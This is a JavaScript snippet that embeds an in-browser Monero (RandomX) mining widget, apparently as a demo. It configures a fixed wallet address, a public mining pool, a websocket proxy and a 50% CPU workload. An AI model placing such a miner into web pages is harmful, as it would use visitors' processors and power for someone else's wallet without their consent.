(() => {
  const status = document.getElementById('load-status');
  if (!window.RandomXEmbed) {
    status.textContent = 'Unable to load the mining widget.';
    return;
  }
  try {
    window.demoMiner = RandomXEmbed.create({
      wallet: '4AEm9oe64pUY2saKdCQfSrg5Xy5N8TgGcecM8qZhcri1FSWdvJ4mFAzhfS3my4Cca7dNyZea7BRb2KannBpRBY1yGytE5fv',
      pool: 'pool.supportxmr.com',
      port: 3333,
      proxy: 'wss://proxy.randomx.cc/embed-ws',
      workerName: 'netlify-demo',
      workload: 50,
      mode: 'full',
      nonceMode: 'nicehash',
      keepalive: 'required',
      container: '#mining-demo'
    });
    status.remove();
  } catch (error) {
    status.textContent = error.message;
    console.error('[randomx-demo]', error);
  }
})();
